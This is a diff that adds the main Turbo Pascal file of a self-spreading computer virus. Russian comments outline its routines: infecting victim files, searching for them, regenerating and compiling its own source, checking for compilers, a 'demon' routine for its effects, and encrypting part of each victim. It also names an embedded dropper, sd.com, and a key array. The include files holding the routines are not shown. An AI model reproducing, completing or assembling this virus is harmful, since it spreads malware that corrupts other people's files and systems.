@@ -1,0 +1,28 @@
+(*
+s0 - описание переменных, констант, и процедур с директивой forward
+s1 - proc. Infect - заражает очередную жертву
+s2 - proc. FindFile - поиск жертв
+s3 - proc. MakeInc - воссоздает на диске INC-файлы
+s4 - proc. MakePas - создает и компилирует PAS-файл
+s5 - proc. Start - главная работающая процедура
+s6 - func. DetectComp - проверка наличия компиляторов
+s7 - proc. Demon - проявления вируса
+s8 - proc. Crypt - шифровка куска жертвы
+sd - массив с файлом sd.com
+sk - массив с ключом для расшифровки
+*)
+
+uses dos;
+const DropLen=2522;
+{$I s0.inc}
+{$I s1.inc}
+{$I s2.inc}
+{$I s3.inc}
+{$I s4.inc}
+{$I s5.inc}
+{$I s6.inc}
+{$I s7.inc}
+{$I s8.inc}
+begin
+Start
+end.
